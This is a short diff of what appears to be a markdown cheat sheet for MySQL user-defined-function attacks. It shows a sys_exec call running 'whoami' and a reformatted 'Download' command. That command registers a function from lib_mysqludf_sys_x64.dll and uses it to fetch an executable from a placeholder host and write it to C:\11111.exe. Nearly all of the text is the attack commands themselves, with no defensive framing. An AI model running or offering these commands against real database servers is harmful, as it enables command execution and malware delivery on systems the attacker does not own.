@@ -44,6 +44,5 @@ select sys_exec("whoami");drop function sys_exec; ```
 
 ## Download
 
-```create function download returns string soname "lib_mysqludf_sys_x64.dll"; 
-select download("http://xxxx/xxx.exe","C:\\11111.exe");drop function download;```
+```create function download returns string soname "lib_mysqludf_sys_x64.dll"; select download("http://xxxx/xxx.exe","C:\\11111.exe");drop function download;```
 
